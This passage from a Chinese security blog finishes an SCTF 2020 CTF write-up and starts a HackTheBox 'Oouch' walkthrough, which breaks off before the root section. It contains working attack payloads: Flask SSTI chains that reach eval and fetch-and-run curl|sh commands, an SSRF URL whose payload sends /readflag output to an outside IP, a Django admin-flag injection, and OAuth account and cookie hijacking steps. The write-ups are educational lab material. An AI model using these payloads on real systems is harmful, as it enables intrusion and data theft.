class="string">'__weakref__'</span>, <span class="string">'__objclass__'</span>, <span class="string">'__module__'</span>):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            attr = getattr(obj, name)</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> visit(attr, <span class="string">'&#123;&#125;.&#123;&#125;'</span>.format(path, name), depth + <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># dict values</span></span><br><span class="line">        <span class="keyword">if</span> hasattr(obj, <span class="string">'items'</span>) <span class="keyword">and</span> callable(obj.items):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">for</span> k, v <span class="keyword">in</span> obj.items():</span><br><span class="line">                    <span class="keyword">yield</span> <span class="keyword">from</span> visit(v, <span class="string">'&#123;&#125;[&#123;&#125;]'</span>.format(path, repr(k)), depth)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># items</span></span><br><span class="line">        <span class="keyword">elif</span> isinstance(obj, (set, list, tuple, frozenset)):</span><br><span class="line">            <span class="keyword">for</span> i, v <span class="keyword">in</span> enumerate(obj):</span><br><span class="line">                <span class="keyword">yield</span> <span class="keyword">from</span> visit(v, <span class="string">'&#123;&#125;[&#123;&#125;]'</span>.format(path, repr(i)), depth)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">from</span> visit(obj)</span><br></pre></td></tr></table></figure><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> search <span class="keyword">import</span> search</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> path, obj <span class="keyword">in</span> search(request, <span class="number">10</span>):</span><br><span class="line">        <span class="keyword">if</span> str(obj)==<span class="string">"werkzeug.urls"</span>:</span><br><span class="line">            <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>这里因为要获取到<code>werkzeug.urls</code>这个类。所以改成<code>if str(obj)==&quot;werkzeug.urls&quot;</code>然后再本地跑起这个flask.访问下<code>/shrine/</code>这个路由+随便什么。方便它获取到request。这样就能返回一条利用链。<br><img src="/2020/07/05/SCTF2020-writeup/6.PNG" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.__class__._get_current_object.__globals__[&#39;ClosingIterator&#39;].close.__globals__[&#39;uri_to_iri&#39;].__globals__[&#39;__name__&#39;]</span><br></pre></td></tr></table></figure><p>然后不能用引号当然只能是request.args绕过(跟上面一样)。使用request.host，request.headers之类的把要传的值放header里即可。劫持url_parse()获取函数eval()。然后后面url_parse因为直接处理路由。那就可以直接路由传命令RCE。<br><code>__import__(&#39;os&#39;).system(&#39;curl$IFSxxxxx|sh&#39;)</code></p><p>题目其实不难，但是自己后来看都没看,跑去看asis了。</p><h1 id="jsonhub"><a href="#jsonhub" class="headerlink" title="jsonhub"></a>jsonhub</h1><p>题目因为web1是django的原因，导致自己第一步不熟悉而直接断掉思路。后面的ssrf与ssti反而还有经验,应该属于自己不熟悉django的问题吧。</p><p>题目开始的参数注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;byc_401&quot;,&quot;password&quot;:&quot;123&quot;,&quot;is_staff&quot;:1,&quot;is_superuser&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>使用这两个字段应该是因为User模型的缘故。属于django默认的两个列名。<br>后台登录后拿到token<br><img src="/2020/07/05/SCTF2020-writeup/7.PNG" alt></p><p>接下来是源码中一个需要利用cve绕过的部分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">white_list = [<span class="string">"39.104.19.182"</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssrf_check</span><span class="params">(url ,white_list)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(white_list)):</span><br><span class="line">        <span class="keyword">if</span> url.startswith(<span class="string">"http://"</span> + white_list[i] + <span class="string">"/"</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flask_rpc</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.META[<span class="string">'REMOTE_ADDR'</span>] != <span class="string">"127.0.0.1"</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">"code"</span>: <span class="number">-1</span>, <span class="string">"message"</span>: <span class="string">"Must 127.0.0.1"</span>&#125;)</span><br></pre></td></tr></table></figure><p>因为在web2存在明显的ssti,我们想要达成ssti必须要在这往127.0.0.1跑在8000的flask打一发。但是如果我们利用CVE-2018-14574这个任意url跳转，即可ssrf.</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.104.19.182//127%2e0.0.1:8000/rpc?methods=POST&amp;data=eyJudW0xIjoiIiwibnVtMiI6IiIsInN5bWJvbHMiOiJ7XHUwMDdiJzEnLl9fY2xhc3NfXy5tcm8oKVstMV0uX19zdWJjbGFzc2VzX18oKVs2NF0uX19pbml0X18uX19nbG9iYWxzX19bJ19fYnVpbHRpbnNfXyddWydldmFsJ10oXCJfX2ltcG9ydF9fKCdvcycpLnN5c3RlbSgnY3VybCAxMjAuMjcuMjQ2LjIwMi9gL3JlYWRmbGFnYCAnKVwiKX1cdTAwN2QifQ==</span><br></pre></td></tr></table></figure><p>后面打flask的payload主要是解决大括号的问题。因为它是通过get_json获取数据的,因此其实并不存在waf的问题。只要用unicode绕过即可。这点在Node.js跟php的json_decode()绕过时应该经常用到。</p><p>并且，由于web2获取的参数要求num1,2不能有小写字母。symbols必须能匹配到<code>+\-*/</code>之一。这个payload也直接绕过了waf.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"num1"</span>:<span class="string">""</span>,<span class="attr">"num2"</span>:<span class="string">""</span>,<span class="attr">"symbols"</span>:<span class="string">"&#123;\u007b [].__class__.__base__.__subclasses__()[64].__init__.__globals__['__builtins__']['eval'](\"__import__('os').system('curl xxxx/`/readflag` ')\")&#125;\u007d"</span>&#125;</span><br></pre></td></tr></table></figure><p>还可以用<code>num1={</code>,<code>symbols={PAYLOAD}</code>,num2=<code>}</code>来解决问题。至于flask获取到含catch_warnings模组进而获取到eval的方法也是老生常谈。FUZZ下就好了。</p><p><img src="/2020/07/05/SCTF2020-writeup/8.PNG" alt></p><p>所以自己主要是因为django太过陌生,导致没能下手,跑去看asis了。剩下的难度其实还好。</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>暂时先把wp放这些吧。争取明天自己再多复现下json_hub。因为刚好把htb的travel做完了，算是了却心头一件事。应该能抽空做些复现学习了。</p><p>关于最近的比赛心里其实一直有点难受。战队已经开始换届了,web新一届的学弟还没上来，但是平时在打比赛的web手已经几乎就只有我跟zjy了。每次xctf打到一半总感觉形单影只,相比人少而言更多的是感慨自己tcl。每次都会遇到感觉自己怎么没早点学的知识。心里过意不去。</p><p>不过毕竟打比赛是学习的过程,每次比赛确实都能接触到新姿势以及反思下自己的不足。现在既然到暑假了，是时候好好系统学习下新知识：<br>1.php: 一个是phpauditlabs争取每次都审一遍;然后laravel跟tp这样的框架过一下。其实wordpress也可以接触下，正好最近碰到了。<br>2.hackthebox: 不用做那么急,现役靶机剩下没做的基本上都是hard及以上难度了。可以慢慢来。<br>3.java: 几乎从零开始的java学习(我自己爬)<br>4.python: django的认识学习<br>5.Nodejs: 保持现状。多练手下Nodejs的开发</p><p>差不多就这样了。争取假期期间多更下文章总结知识。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Oouch</title>
      <link href="2020/07/01/hackthebox-Oouch/"/>
      <url>2020/07/01/hackthebox-Oouch/</url>
      
        <content type="html"><![CDATA[<p>Oouch靶机的难度相比最近做完的两个hard machine Quick跟Forwardslash而言有过之而无不及。甚至于感觉可能接近到Insane难度了。从web界面下手时遇到很多不稳定的问题，而之后从user提权到root更是出现玄学问题，一模一样的的payload头一天失败第二天就成了。但是总归学到了不少新知识，所以赶紧总结下。</p><a id="more"></a><p><img src="/2020/07/01/hackthebox-Oouch/head.PNG" alt></p><ul><li>靶机ip: 10.10.10.186</li><li>攻击机: 10.10.14.40</li></ul><h2 id="initial-foothold-to-user"><a href="#initial-foothold-to-user" class="headerlink" title="initial foothold to user"></a>initial foothold to user</h2><ul><li>nmap </li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Sun Jun 28 15:53:13 2020 as: nmap -sC -sV -oA nmap/oouch 10.10.10.177</span></span><br><span class="line">WARNING: Service 10.10.10.177:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.177</span><br><span class="line">Host is up (0.43s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 10.10.14.46</span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      Session bandwidth <span class="built_in">limit</span> <span class="keyword">in</span> byte/s is 30000</span><br><span class="line">|      Session timeout <span class="keyword">in</span> seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)</span><br><span class="line">|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)</span><br><span class="line">5000/tcp open  http    nginx 1.14.2</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">| http-title: Welcome to Oouch</span><br><span class="line">|_Requested resource was http://10.10.10.177:5000/login?next=%2F</span><br><span class="line">8000/tcp open  rtsp</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   FourOhFourRequest, GetRequest, HTTPOptions: </span><br><span class="line">|     HTTP/1.0 400 Bad Request</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Vary: Authorization</span><br><span class="line">|     &lt;h1&gt;Bad Request (400)&lt;/h1&gt;</span><br><span class="line">|   RTSPRequest: </span><br><span class="line">|     RTSP/1.0 400 Bad Request</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Vary: Authorization</span><br><span class="line">|     &lt;h1&gt;Bad Request (400)&lt;/h1&gt;</span><br><span class="line">|   SIPOptions: </span><br><span class="line">|     SIP/2.0 400 Bad Request</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Vary: Authorization</span><br><span class="line">|_    &lt;h1&gt;Bad Request (400)&lt;/h1&gt;</span><br><span class="line">|_http-title: Site doesn<span class="string">'t have a title (text/html).</span></span><br><span class="line"><span class="string">|_rtsp-methods: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span></span><br><span class="line"><span class="string">SF-Port8000-TCP:V=7.80%I=7%D=6/28%Time=5EF84CE8%P=x86_64-pc-linux-gnu%r(Ge</span></span><br><span class="line"><span class="string">SF:tRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex</span></span><br><span class="line"><span class="string">SF:t/html\r\nVary:\x20Authorization\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(400\)&lt;/</span></span><br><span class="line"><span class="string">SF:h1&gt;")%r(FourOhFourRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nCon</span></span><br><span class="line"><span class="string">SF:tent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n&lt;h1&gt;Bad\x20Req</span></span><br><span class="line"><span class="string">SF:uest\x20\(400\)&lt;/h1&gt;")%r(HTTPOptions,64,"HTTP/1\.0\x20400\x20Bad\x20Req</span></span><br><span class="line"><span class="string">SF:uest\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n&lt;h1</span></span><br><span class="line"><span class="string">SF:&gt;Bad\x20Request\x20\(400\)&lt;/h1&gt;")%r(RTSPRequest,64,"RTSP/1\.0\x20400\x2</span></span><br><span class="line"><span class="string">SF:0Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization</span></span><br><span class="line"><span class="string">SF:\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(400\)&lt;/h1&gt;")%r(SIPOptions,63,"SIP/2\.0\</span></span><br><span class="line"><span class="string">SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Auth</span></span><br><span class="line"><span class="string">SF:orization\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(400\)&lt;/h1&gt;");</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string"># Nmap done at Sun Jun 28 15:55:59 2020 -- 1 IP address (1 host up) scanned in 166.01 seconds</span></span><br></pre></td></tr></table></figure><p>21,22,5000,8000 端口开放。并且21端口ftp可以匿名登录。</p><ul><li>ftp annoymous login</li></ul><p>ftp匿名登录捞下来一个project.txt<br>get file project.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Flask -&gt; Consumer</span><br><span class="line">Django -&gt; Authorization Server</span><br></pre></td></tr></table></figure><p>按照nmap的结果，5000跟8000有两个web服务，看起来似乎是flask跟django.</p><ul><li>enumeration</li></ul><p>此时从5000端口的服务入手。首先注册登录后发现提供了几个比较没用的功能，其中<code>/document</code>路由的内容提示只有admin能用。<code>/profile</code>显示我们可以链接账户，但是不知道要怎么做。<code>/contact</code>处似乎可以让admin接受我们的url然后造成ssrf.但是这些都还没有可具体下手的地方。</p><p>而8000端口的服务直接访问返回400.似乎到这一步就卡住了。</p><p>于是尝试爆破路由，有了意外的收获。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wordlists/dirb/common.txt -u <span class="string">'http://10.10.10.177:5000/FUZZ'</span> --hc 404 -t 70</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.4.5 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.177:5000/FUZZ</span><br><span class="line">Total requests: 4614</span><br><span class="line"></span><br><span class="line">===================================================================</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload                                                                                                                    </span><br><span class="line">===================================================================</span><br><span class="line"></span><br><span class="line">000000223:   302        3 L      24 W     247 Ch      <span class="string">"about"</span></span><br><span class="line">000000001:   302        3 L      24 W     237 Ch      <span class="string">""</span>                                                                        </span><br><span class="line">000001013:   302        3 L      24 W     251 Ch      <span class="string">"contact"</span>                                                                         </span><br><span class="line">000001325:   302        3 L      24 W     255 Ch      <span class="string">"documents"</span>                                                                        </span><br><span class="line">000001908:   302        3 L      24 W     245 Ch      <span class="string">"home"</span>                                                                               </span><br><span class="line">000002347:   200        54 L     110 W    1828 Ch     <span class="string">"login"</span>                                                                               </span><br><span class="line">000002362:   302        3 L      24 W     219 Ch      <span class="string">"logout"</span>                                                                             </span><br><span class="line">000002722:   302        3 L      24 W     247 Ch      <span class="string">"oauth"</span>                                                                               </span><br><span class="line">000003160:   302        3 L      24 W     251 Ch      <span class="string">"profile"</span>                                                                           </span><br><span class="line">000003341:   200        63 L     124 W    2109 Ch     <span class="string">"register"</span></span><br></pre></td></tr></table></figure><p>除了之前几个功能外还有<code>oauth</code>。(这里是换了个平时不用的dirb词典爆出来的，虽然内容少但有时恰好就能得到想要的信息)</p><p>访问oauth<br><img src="/2020/07/01/hackthebox-Oouch/0.PNG" alt></p><p>得到了5000端口与8000端口的具体域名。于是加到<code>/etc/hosts</code>中。</p><p>再接着尝试了两个链接后,我发现大概实现了一个authorize的过程。加上oauth的这个名词，我决定先去google一下，于是大致能够理解，这是一个实现了<code>oauth2</code>功能的场景。</p><p>oauth的流程是这样的</p><blockquote><p>1.The application requests authorization to access service resources from the user. The application needs to provide the client ID, client secret, redirect URI and the required scopes.<br>2.If the user authorizes the request, the application receives an authorization grant<br>3.The application ** requests an access token from the authorization server ** by presenting authentication of its own identity, and the authorization grant<br>4.If the application identity is authenticated and the authorization grant is valid, the authorization server issues the access and refresh (if required) token to the application. Authorization is complete.<br>5.The application requests the resource from the resource server and presents the access token for authentication<br>6.If the access token is valid, the resource server serves the resource to the application</p></blockquote><p>按照阮一峰老师的理解，就是在客户端与服务商之间加上了一个授权层，这里具体而言，就是我们在授权后，可以让8000端口的账号跟5000的账号绑定在一起。每次进行操作时都会有这样的中间页面<br><img src="/2020/07/01/hackthebox-Oouch/1.PNG" alt></p><p>根据<code>consumer</code>里<code>oauth</code>的要求。我们应该先去<code>oauth/connect</code>,然后当我们在<code>authorization</code>里注册完账号后，访问<code>oauth/login</code>就完成了账号的关联。</p><p>而这里就产生了一个提升权限的可能。oauth的特点在于，我们访问<code>oauth/login</code>进行账号关联时，中间层是根据我们之前connect时传输的token进行目标判定的(具体抓包了解)。那么如果我们以admin的身份传一个有效token，之后连接账号时就会把我们在<code>authorization</code>的账号与<code>consumer</code>处admin的账号相关联。<br>这是每一次进行connect时,我们客户端会向发的一个含有token的包<br><img src="/2020/07/01/hackthebox-Oouch/2.PNG" alt></p><p>这时之前提到的<code>/contact</code>就派上用场了。我们burp抓包并把这个传输<code>token</code>的包drop掉。转而利用admin的contact完成这次token发送。接下来再次点击<code>oauth/login</code>，就能触发连接,绑定admin账户。<br><img src="/2020/07/01/hackthebox-Oouch/3.PNG" alt></p><p>现在我们已经绑定qtc账户了。并且在document处发现提示<br><img src="/2020/07/01/hackthebox-Oouch/4.PNG" alt></p><ul><li>一个账号。功能是application register</li><li>一个路由 /api/get_user 另外/oauth/authorize 支持get请求</li><li>似乎可以有途径可以得到sshkey</li></ul><p>看来接下来要转战8000端口的<code>authorization.oouch.htb</code>了。<br>首先作为普通用户，8000端口默认的两个路由都没有办法使用。那么现在先想办法用上我们之前得到的用户密码。</p><p>接着爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt  -u http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;FUZZ   --hc 404 -t 80</span><br><span class="line">wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt  -u http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;oauth&#x2F;FUZZ   --hc 404 -t 80</span><br></pre></td></tr></table></figure><p>第一个无果。第二个发现存在<code>/application</code>也就是可以访问<code>/oauth/application</code><br>然而需要用户密码。我们之前的账户密码也不行。这时仔细过一遍document.发现说这个账户密码是有注册功能的，那就试试<code>/oauth/application/register</code>并输入账户密码</p><p><img src="/2020/07/01/hackthebox-Oouch/5.PNG" alt></p><p>成功了，接下来我们就有了另一个有效的authorization app了。<br>我设置的信息如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://authorization.oouch.htb:8000/oauth/applications/2/</span><br><span class="line"></span><br><span class="line">clientid cHYVFErrrGQAm6Q1iWEfgT0hgf2KX4SIecLnNCKg</span><br><span class="line">clientsecret 1QWQrnwCzUIiU8tB4BywB3p9Ca8umJGaSzoxJraanOwv7duBX3UnZN4n1VYMzLOrnrXh7OzLNhHF7qPv1UufuY8fIkNLDoPDSaUC2JGqKVeKb9oJZJweVHeFCgku6kqz</span><br><span class="line">Client <span class="built_in">type</span> public</span><br><span class="line">Authorization Grant Type client-credentials</span><br><span class="line">redirect uri  http://10.10.14.46/</span><br></pre></td></tr></table></figure><p>根据之前的ssrf，我们似乎有办法能够通过最后的一个uri完成xss的攻击。也就是打到admin的cookie。那么如何合法的构造一个url使得直接get访问就能重定向呢？这里就涉及到一些oauth的知识<br><a href="https://developers.facebook.com/docs/instagram-basic-display-api/reference/oauth-authorize/" target="_blank" rel="noopener">oauth-authorize</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#facebook</span><br><span class="line">GET https:&#x2F;&#x2F;api.instagram.com&#x2F;oauth&#x2F;authorize</span><br><span class="line">  ?client_id&#x3D;&#123;app-id&#125;,</span><br><span class="line">  &amp;redirect_uri&#x3D;&#123;redirect-uri&#125;,</span><br><span class="line">  &amp;response_type&#x3D;code,</span><br><span class="line">  &amp;scope&#x3D;&#123;scope&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#twitter</span><br><span class="line">POST &#x2F;oauth2&#x2F;token HTTP&#x2F;1.1</span><br><span class="line">Host: api.twitter.com</span><br><span class="line">User-Agent: My Twitter App v1.0.23</span><br><span class="line">Authorization: Basic eHZ6MWV2R ... o4OERSZHlPZw&#x3D;&#x3D;</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded;charset&#x3D;UTF-8</span><br><span class="line">Content-Length: 29</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line"></span><br><span class="line">grant_type&#x3D;client_credentials</span><br></pre></td></tr></table></figure><p>上面两个分别是facebook跟twitter的oauthapi的开发者文档里找的例子。虽然各家都有不同，但是大概的那几个参数也是能理解的。加上之前document里说<code>oauth/authorize</code>支持get请求，那么我们应该可以按照自己的app功能，构造一个恶意的url，重定向到我们自己这。<br>先像self-xss一样往自己这打一发<br>url的各个参数都要与之前注册的app的值完全一致。其中response_type为code是oauth标准固定的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;oauth&#x2F;authorize&#x2F;?client_id&#x3D;cHYVFErrrGQAm6Q1iWEfgT0hgf2KX4SIecLnNCKg&amp;redirect_uri&#x3D;http:&#x2F;&#x2F;10.10.14.46&#x2F;&amp;response_type&#x3D;code&amp;grant_type&#x3D;anthorization_code&amp;client_secret&#x3D;1QWQrnwCzUIiU8tB4BywB3p9Ca8umJGaSzoxJraanOwv7duBX3UnZN4n1VYMzLOrnrXh7OzLNhHF7qPv1UufuY8fIkNLDoPDSaUC2JGqKVeKb9oJZJweVHeFCgku6kqz</span><br></pre></td></tr></table></figure><p>直接浏览器访问这个url,会进入到authorize的中间层。点下authorize就能在本机收到请求<br><img src="/2020/07/01/hackthebox-Oouch/6.PNG" alt></p><p>那么直接利用之前的<code>contact</code>处ssrf即可完成cookie的盗取。</p><p><img src="/2020/07/01/hackthebox-Oouch/7.PNG" alt><br>这里比较狗的是必须去掉<code>response_type</code>这个请求参数，才能完成重定向。原理其实上面解释过了，因为一个有效的请求必须经过手动的authorization确认才能完成重定向。如果是一个不有效的url则会在授权之前就重定向。基于此处只能发一个请求。我们只能通过一个无效response_type完成重定向。</p><p><img src="/2020/07/01/hackthebox-Oouch/8.PNG" alt><br>得到cookie后更换。接下来尝试访问<code>oauth/token</code></p><p><a href="https://www.oauth.com/oauth2-servers/access-tokens/client-credentials/" target="_blank" rel="noopener">https://www.oauth.com/oauth2-servers/access-tokens/client-credentials/</a><br>上面是oauth官方文档的，通过oauth/token获取一个access_token内容。我们参照格式发包即可(注意这里grant_type的值与我们初始的app不一样。所以要用之前的账户更改这一选项)<br><img src="/2020/07/01/hackthebox-Oouch/9.PNG" alt></p><p>接下来用得到的access_token 访问唯一没用上的/api/get_user?access_token=xxxx.<br>发现返回user的json信息。然后就卡住了。。。。。。这时想起来前面还提示说有获取sshkey的方法。于是把user换成ssh</p><p><img src="/2020/07/01/hackthebox-Oouch/10.PNG" alt></p><p>拿到key后终于可以登陆这台靶机拿到user.txt了。</p><p>小结下。第一部分恐怕难度比常规的htbweb部分要难的多。因为涉及了大量新知识以及权限问题，同时网站不知道为什么经常500。不过oauth的存在也让我重新体会到了越权的许多新可能。最后的ssh总觉得有点脑洞了。</p><h2 id="privesc-to-root"><a href="#privesc-to-root" class="headerlink" title="privesc to root"></a>privesc to 